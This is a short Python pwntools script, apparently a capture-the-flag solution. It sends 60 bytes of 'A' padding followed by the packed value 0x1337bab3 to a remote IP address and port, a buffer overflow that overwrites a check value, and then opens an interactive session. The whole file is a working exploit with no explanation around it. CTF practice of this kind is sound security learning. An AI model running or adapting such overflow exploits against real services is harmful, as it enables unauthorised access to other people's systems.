from pwn import *

code = p32(0x1337bab3)

padding = b"\x41"*60

p = remote("206.189.121.131",31390)



p.sendline(padding+code)

p.interactive()
